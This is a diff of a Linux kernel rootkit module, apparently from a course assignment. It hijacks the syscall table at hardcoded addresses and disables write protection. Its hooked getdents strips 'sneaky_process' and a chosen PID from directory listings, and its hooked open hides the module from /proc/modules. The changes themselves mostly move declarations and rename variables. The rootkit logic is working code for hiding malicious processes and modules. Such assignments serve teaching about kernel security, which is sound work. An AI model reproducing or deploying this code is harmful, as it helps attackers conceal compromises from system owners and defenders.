@@ -36,7 +36,7 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 // Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 // We're getting its adddress from the System.map file (see above).
 static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
-// static bool hide_spid_flag = False;
+
 static bool hide_module_flag = false;
 static char *spid = "";
 module_param(spid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
@@ -55,13 +55,16 @@ asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count) {
+  char *next;
+  unsigned short curr_reclen;
+  struct linux_dirent *curr;
+  size_t sz_dif, count_sneaky;
   int returned_sz = original_getdents(fd, dirp, count);
-  struct linux_dirent *curr = dirp;
   int cursor = 0;
   while (cursor < returned_sz) {
 
     curr = (struct linux_dirent *)((char *)dirp + cursor);
-    unsigned short curr_reclen = curr->d_reclen;
+    curr_reclen = curr->d_reclen;
     // check sneaky_process
     if (!strcmp(curr->d_name, "sneaky_process") ||
         !strcmp(curr->d_name, spid)) {
@@ -72,10 +75,10 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
         printk(KERN_INFO "Found Sneaky PID\n");
       }
 
-      char *next = (char *)curr + curr_reclen;
-      size_t sz_dif = (size_t)(next - (char *)dirp);
-      size_t count = returned_sz - sz_dif;
-      memmove(curr, next, count);
+      next = (char *)curr + curr_reclen;
+      sz_dif = (size_t)(next - (char *)dirp);
+      count_sneaky = returned_sz - sz_dif;
+      memmove(curr, next, count_sneaky);
       returned_sz = returned_sz - curr_reclen;
       continue;
     }
@@ -112,10 +115,6 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
     }
 
   } else {
-    /* if (!strcmp(pathname, proc_dir)) { */
-    /*   printk(KERN_INFO "Starting to hide Sneaky PID.\n"); */
-    /*   hide_spid_flag = True; */
-    /* } */
     if (!strcmp(pathname, proc_modules)) {
       printk(KERN_INFO "Starting to hide Sneaky Module.\n");
       hide_module_flag = true;
@@ -208,6 +207,6 @@ static void exit_sneaky_module(void) {
   write_cr0(read_cr0() | 0x10000);
 }
 
-MODULE_LICENSE("ws146");
+MODULE_LICENSE("vcm");
 module_init(initialize_sneaky_module); // what's called upon loading
 module_exit(exit_sneaky_module);       // what's called upon unloading
